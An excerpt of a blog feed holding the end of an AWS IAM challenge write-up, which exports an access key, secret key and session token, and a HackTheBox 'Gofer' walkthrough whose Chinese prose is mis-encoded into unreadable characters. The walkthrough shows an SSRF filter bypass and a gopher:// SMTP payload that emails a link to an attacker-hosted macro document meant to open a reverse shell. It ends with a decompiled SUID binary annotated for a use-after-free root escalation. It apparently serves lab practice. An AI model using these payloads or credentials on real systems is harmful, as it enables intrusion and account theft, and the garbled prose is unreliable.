class="hljs-built_in">export</span> AWS_ACCESS_KEY_ID=ASIARK7LBOHXFM42OLPL<br>&gt; <span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=X9HbOd6L/1GnaZ+M/Q7PXpNXSlqT/bc7xTdQenJe<br>&gt; <span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=FwoG......Uxtg==<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-08-13%2023.29.28_TJUbKlzXWo.png" alt=""></p><h2 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h2><ul><li>ChatGPT</li><li><a href="https://docs.aws.amazon.com/" title="https://docs.aws.amazon.com/">https://docs.aws.amazon.com/</a></li><li><a href="https://zhuanlan.zhihu.com/p/640694595" title="https://zhuanlan.zhihu.com/p/640694595">https://zhuanlan.zhihu.com/p/640694595</a></li><li><a href="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html#_6-one-final-push" title="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html">https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Cloud Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gofer-HackTheBox</title>
    <link href="/2023/08/06/Gofer-HackTheBox/"/>
    <url>/2023/08/06/Gofer-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>åœŸæ‹¨é¼ å¸¦æˆ‘å›å¿†äº†ä¸€æ³¢CSAPPå®éªŒ</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Cp2Mlfna7b.png" alt=""></p><h4 id="smbå…±äº«"><a href="#smbå…±äº«" class="headerlink" title="smbå…±äº«"></a>smbå…±äº«</h4><p>æš´éœ²äº†sharesç›®å½•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LCTBTR6fM9.png" alt=""></p><p>è·å–åˆ°äº†ä¸€ä¸ªmail</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AJ7xSMCetu.png" alt=""></p><p>å†…å®¹æ˜¯åœ¨æç¤ºé’“é±¼é£é™©ï¼Œé‡è¦çš„å†…å®¹éƒ½é€šè¿‡é‚®ä»¶åœ¨å†…éƒ¨å‘é€ã€‚é¶æœºåˆå¼€ç€ä¸€ä¸ªSMTPç«¯å£ï¼ŒçŠ¶æ€æ˜¯filteredï¼Œæˆ‘æœ‰ç‚¹æ„Ÿè§‰æ˜¯è¦é€šè¿‡SSRFæ¥æ‰“ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6u7wuUGV0L.png" alt=""></p><h4 id="ç½‘ç«™"><a href="#ç½‘ç«™" class="headerlink" title="ç½‘ç«™"></a>ç½‘ç«™</h4><p>ç•Œé¢ä¸Šæ²¡æœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Œéƒ½æ˜¯å‰ç«¯é¡µé¢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jk3qjWMmGx.png" alt=""></p><h4 id="ç›®å½•çˆ†ç ´"><a href="#ç›®å½•çˆ†ç ´" class="headerlink" title="ç›®å½•çˆ†ç ´"></a>ç›®å½•çˆ†ç ´</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WlJ79SflmJ.png" alt=""></p><p>åªæœ‰ä¸€äº›å‰ç«¯æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7gn7_e49lZ.png" alt=""></p><h4 id="è™šæ‹Ÿä¸»æœºçˆ†ç ´"><a href="#è™šæ‹Ÿä¸»æœºçˆ†ç ´" class="headerlink" title="è™šæ‹Ÿä¸»æœºçˆ†ç ´"></a>è™šæ‹Ÿä¸»æœºçˆ†ç ´</h4><p>gobusterå…¨æ˜¯301ï¼Œè€Œä¸”æˆ‘è¿˜æ‰¾ä¸åˆ°å±è”½301çš„å‚æ•°</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9ngohgMzMI.png" alt=""></p><p>ä½¿ç”¨ffufè¯•ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªproxy.gofer.htb</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_UhmZVMj7ym.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="proxy-gofer-htb"><a href="#proxy-gofer-htb" class="headerlink" title="proxy.gofer.htb"></a>proxy.gofer.htb</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4-jv1dt9e_.png" alt=""></p><p>å› ä¸ºæ˜¯htbï¼Œä¸å¤ªæƒ³çˆ†ç ´è´¦å·å¯†ç ã€‚å…ˆçœ‹çœ‹ç›®å½•æŠŠ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jzWJ-rTjTj.png" alt=""></p><p>é‚£å°±åªèƒ½çˆ†ç ´äº†ï¼Œæ ¹æ®ä¹‹å‰çš„é‚®ä»¶ï¼Œå¯ä»¥çœ‹å‡ºä»–ä»¬ç”¨è‡ªå·±çš„å§“ååšçš„ç”¨æˆ·åã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yM0PaZyXB4.png" alt=""></p><p>åŠ ä¸Šå®˜ç½‘æš´éœ²çš„å§“åï¼Œå…ˆçˆ†ä¸€ä¸‹è¿™å‡ ä¸ªäºº</p><h4 id="401è®¤è¯çˆ†ç ´"><a href="#401è®¤è¯çˆ†ç ´" class="headerlink" title="401è®¤è¯çˆ†ç ´"></a>401è®¤è¯çˆ†ç ´</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Ferw2E1FnK.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lgh7NdgAhb.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TRCOu1qlrQ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p-ZPcwruII.png" alt=""></p><p>æœ€åè®¾ç½®Base64ç¼–ç å’Œä¸é€šè¿‡URLç¼–ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d2iLG-LOAh.png" alt=""></p><p>å¯„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_prrbl93-2B.png" alt=""></p><h4 id="æŸ³æš—èŠ±æ˜"><a href="#æŸ³æš—èŠ±æ˜" class="headerlink" title="æŸ³æš—èŠ±æ˜"></a>æŸ³æš—èŠ±æ˜</h4><p>æ²¡æ‹›äº†ï¼Œçœ‹çœ‹å®˜æ–¹è®ºå›ã€‚ä½œè€…å¥½åƒæƒ³è®©æˆ‘ä»¬çŒœ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cEzzNe04-M.png" alt=""></p><p>çœ‹åˆ°äº†è·Ÿæˆ‘ä¸€æ ·è¢«401å¡ä½çš„å“¥ä»¬ï¼Œæç¤ºç”¨å…¶ä»–çš„è¯·æ±‚æ–¹å¼</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hCd3UKzvuq.png" alt=""></p><p>çœŸå°±æœ‰ä¸ªindex.phpï¼Œç¡®å®éœ€è¦guessâ€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pDVaHkh3VK.png" alt=""></p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>æç¤ºéœ€è¦URLå‚æ•°ï¼Œè¿™é‡Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯SSRFäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6L2g-WTUIf.png" alt=""></p><p>è¿‡æ»¤äº†127ï¼Œç®€å•ç»•è¿‡ä¸€ä¸‹</p><p>å°†IPè½¬æˆåå…­è¿›åˆ¶ï¼Œå¯ä»¥æˆåŠŸå›æ˜¾</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9bcZvsDIAT.png" alt=""></p><p>Fileåè®®ä¹Ÿè¢«é»‘åå•äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9CAo4zfkkk.png" alt=""></p><h4 id="SSRFæ‰“SMTP"><a href="#SSRFæ‰“SMTP" class="headerlink" title="SSRFæ‰“SMTP"></a>SSRFæ‰“SMTP</h4><p>ä¹‹å‰å°±æƒ³è¿‡è¿™å°é¶æœºå¯èƒ½æ˜¯SSRFæ‰“SMTPã€‚ç®€å•äº†è§£ä¸€ä¸‹ï¼Œå¯ä»¥é€šè¿‡Gopherå»å‘é‚®ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8rb3lHjO24.png" alt=""></p><p>ä½†è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿåæ¥æƒ³èµ·è¿™å°é‚®ä»¶çš„å†…å®¹ï¼Œæåˆ°äº†Jocelyn ä¼šéšä¾¿ç‚¹å‡»åˆ«äººå‘ç»™å¥¹çš„é‚®ä»¶ã€‚è€Œä¸”å»ºè®®ä»¥åçš„é‡è¦æ–‡æ¡£éƒ½é€šè¿‡<code>.odt</code>æ ¼å¼åœ¨å†…éƒ¨é‚®ä»¶ä¼ è¾“ã€‚å¹¶ä¸”æç¤ºäº†ä»–ä»¬ä½¿ç”¨çš„æ˜¯Libreoffice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6u7wuUGV0L.png" alt=""></p><h4 id="Libreofiiceå®æ–‡ä»¶é’“é±¼"><a href="#Libreofiiceå®æ–‡ä»¶é’“é±¼" class="headerlink" title="Libreofiiceå®æ–‡ä»¶é’“é±¼"></a>Libreofiiceå®æ–‡ä»¶é’“é±¼</h4><p>é©¬ä¸Šå¼€å§‹å†™é‚®ä»¶é’“é±¼</p><p>æ‰¾åˆ°äº†ä¸€ä¸ªç”ŸæˆLibreofiiceæ¶æ„å®åå¼¹shellçš„é¡¹ç›®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kLTVRBlBXD.png" alt=""></p><p>ç”Ÿæˆæœ¨é©¬</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_a9gNacq8n_.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YOI6gff9g_.png" alt=""></p><p>é€šè¿‡gopheræ‰“SMTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher%3A%2F%2F0x7f000001%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Croot%40gofer.htb%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20%3Ca%20http%3A%2F%2F10.10.16.76%3A8000%2Ftest.odt%3EGofer%20Important%20news%3C%2Fa%3E%250ASSRF%20AND%20SMTP%250A.<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Pt0l3sv3KW.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_saZAiYuEbf.png" alt=""></p><p>é¶æœºç¡®å®æ¥è·å–test.odtäº†ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸåå¼¹shellã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aq9SjBVYgM.png" alt=""></p><p>åé¢çœ‹äº†ä¸€ä¸‹ï¼Œmacro-generatorå¥½åƒåªæ˜¯ç”Ÿæˆå®æ–‡ä»¶é‡Œçš„æ¶æ„è¯­å¥ã€‚éœ€è¦æˆ‘ä»¬è‡ªå·±ç”Ÿæˆæ–‡ä»¶</p><p>åæ¥åˆæ‰¾äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" title="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html">https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html</a></p><p>ä½†éœ€è¦ä¸€ä¸ªå›¾å½¢åŒ–ç•Œé¢çš„Libreofficeï¼Œï¼Œå¼€äº†å°Ubuntu</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KEcyiwZyy2.png" alt=""></p><p>è®¾ç½®æˆæ‰“å¼€æ–‡æ¡£æ—¶è‡ªåŠ¨æ‰§è¡Œå®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8yDDRTWLAs.png" alt=""></p><p>å†æ¬¡é€šè¿‡gopheræ‰“SMTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher%3A%2F%2F0x7f000001%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Croot%40gofer.htb%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20%3Ca%20http%3A%2F%2F10.10.16.76%3A8000%2Ftest.odt%3EGofer%20Important%20news%3C%2Fa%3E%250ASSRF%20AND%20SMTP%250A.<br></code></pre></td></tr></table></figure><p>æˆåŠŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_UjfbAnsge4.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>linpeasæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6eFq0ius-w.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__pjAwvYrjq.png" alt=""></p><p>pspyå¯ä»¥çœ‹åˆ°rootä¸€ç›´åœ¨è¿è¡Œè„šæœ¬ï¼Œå¹¶ä¸”çœ‹åˆ°äº†ç–‘ä¼¼ tbuckley çš„å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_rqNRLJAagj.png" alt=""></p><p>ç¡®å®æ˜¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IgTN15Dl-Q.png" alt=""></p><p>ä¹‹ålinpeasåˆæ‰«äº†ä¸€éï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®åœ¨jhudsonçš„æ—¶å€™å°±å‘ç°äº†ï¼Œä½†æ²¡æƒé™ã€‚ç°åœ¨tbuckleyæ˜¯devç»„çš„ï¼Œå¯ä»¥æ‰§è¡Œçœ‹çœ‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yVXuS4X_-C.png" alt=""></p><p>åŠŸèƒ½å¦‚ä¸‹å›¾ï¼Œæ„Ÿè§‰å¹¶ä¸èƒ½åšä»€ä¹ˆã€‚å¤‡ä»½ç¬”è®°éœ€è¦adminè§’è‰²</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_u9oZ50iUls.png" alt=""></p><p>ä½†æ˜¯æ„Ÿè§‰è¿™ä¸ªè½¯ä»¶åº”è¯¥æ˜¯çªç ´å£ï¼Œæ¯•ç«Ÿå®ƒæ˜¯root SUIDçš„ï¼Œè¿™æ—¶å€™æƒ³åˆ°åç¼–è¯‘ï¼Œçœ‹çœ‹ä»£ç é€»è¾‘èƒ½å¦åˆ©ç”¨</p><p>æŠŠè½¯ä»¶ä¸‹è½½ä¸‹æ¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bHeDShSdd8.png" alt=""></p><p>ä½¿ç”¨Ghidraåç¼–è¯‘å‡ºæºç ï¼š<a href="https://github.com/NationalSecurityAgency/ghidra" title="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MQxS73ev6t.png" alt=""></p><h4 id="notesä»£ç è§£è¯»"><a href="#notesä»£ç è§£è¯»" class="headerlink" title="notesä»£ç è§£è¯»"></a>notesä»£ç è§£è¯»</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">__uid_t</span> _Var1;<br>  <span class="hljs-type">int</span> iVar2;<br>  undefined4 local_1c;<br>  <span class="hljs-type">void</span> *local_18;<br>  <span class="hljs-type">void</span> *local_10;<br>  <br>  local_1c = <span class="hljs-number">0</span>;<br>  local_10 = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>;<br>  local_18 = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<br>        <span class="hljs-string">&quot;========================================\n1) Create an user and choose an username\n2) Show  user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not y et implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n=============================== =========\n\n&quot;</span><br>        );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(&amp;DAT_0010212b,&amp;local_1c);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">switch</span>(local_1c) &#123;<br>    <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// Create an user and choose an username</span><br>    <span class="hljs-comment">// ç”³è¯·å†…å­˜</span><br>      local_10 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>      <span class="hljs-keyword">if</span> (local_10 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>      &#125;<br>      <span class="hljs-built_in">memset</span>(local_10,<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>);<br>      <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>),<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>);<br>      _Var1 = getuid();<br>      <br>      <span class="hljs-keyword">if</span> (_Var1 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// uidä¸º0åˆ™è®¾ç½®è¿™å—å†…å­˜çš„å†…å®¹ä¸ºadmin(å°ç«¯å­˜å‚¨)</span><br>        *(undefined4 *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>) = <span class="hljs-number">0x696d6461</span>; <br>        *(undefined *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x1c</span>) = <span class="hljs-number">0x6e</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// å¦åˆ™è®¾ç½®ä¸ºuser</span><br>        *(undefined4 *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>) = <span class="hljs-number">0x72657375</span>;<br>      &#125;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Choose an username: &quot;</span>);<br>      <span class="hljs-comment">// è¾“å…¥ç”¨æˆ·åå†è¿”å›ä¿¡æ¯</span><br>      __isoc99_scanf(&amp;DAT_00102144,local_10);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">// Show user information</span><br>      <span class="hljs-keyword">if</span> (local_10 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;First create an user!\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUsername: %s\n&quot;</span>,local_10);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Role: %s\n\n&quot;</span>,(<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// Delete an user</span><br>      <span class="hljs-keyword">if</span> (local_10 != (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        <span class="hljs-built_in">free</span>(local_10); <span class="hljs-comment">// é—®é¢˜çš„å…³é”®ï¼Œè¿™é‡Œé‡Šæ”¾äº†å†…å­˜ï¼Œä½†å¹¶æ²¡æœ‰åˆ é™¤è¯¥æŒ‡é’ˆ</span><br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// Write a note</span><br>      local_18 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>      <span class="hljs-built_in">memset</span>(local_18,<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>);<br>      <span class="hljs-keyword">if</span> (local_18 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>      &#125;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write your note:&quot;</span>);<br>      __isoc99_scanf(&amp;DAT_0010218b,local_18);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-comment">// Show a note</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note: %s\n\n&quot;</span>,local_18);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-comment">// Save a note (not yet implemented)</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Coming soon!\n&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-comment">// Delete a note</span><br>      <span class="hljs-keyword">if</span> (local_18 != (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        <span class="hljs-built_in">free</span>(local_18);<br>        local_18 = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>;<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-comment">// Backup notes</span><br>      <span class="hljs-keyword">if</span> (local_10 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;First create an user!\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        iVar2 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>),<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access granted!&quot;</span>);<br>          <span class="hljs-comment">// ä½¿ç”¨rootæƒé™æ‰§è¡Œä»¥ä¸‹tarå‘½ä»¤</span><br>          setuid(<span class="hljs-number">0</span>);<br>          setgid(<span class="hljs-number">0</span>);<br>          system(<span class="hljs-string">&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access denied: you don\&#x27;t have the admin role!\n&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å…³é”®ç‚¹"><a href="#å…³é”®ç‚¹" class="headerlink" title="å…³é”®ç‚¹"></a>å…³é”®ç‚¹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// Delete an user</span><br>  <span class="hljs-keyword">if</span> (local_10 != (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">free</span>(local_10); <span class="hljs-comment">// é—®é¢˜çš„å…³é”®ï¼Œè¿™é‡Œé‡Šæ”¾äº†å†…å­˜ï¼Œä½†æŒ‡é’ˆlocal_10è¿˜æ˜¯æŒ‡å‘é‚£å—åœ°å€</span><br>  &#125;<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// Write a note</span><br><span class="hljs-comment">// è¿™é‡Œæœ‰ç”³è¯·äº†0x28çš„åœ°å€ï¼Œå…¶å®å°±æ˜¯case3åˆ é™¤çš„é‚£å—</span><br>  local_18 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>  <span class="hljs-built_in">memset</span>(local_18,<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>);<br>  <span class="hljs-keyword">if</span> (local_18 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>                <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span 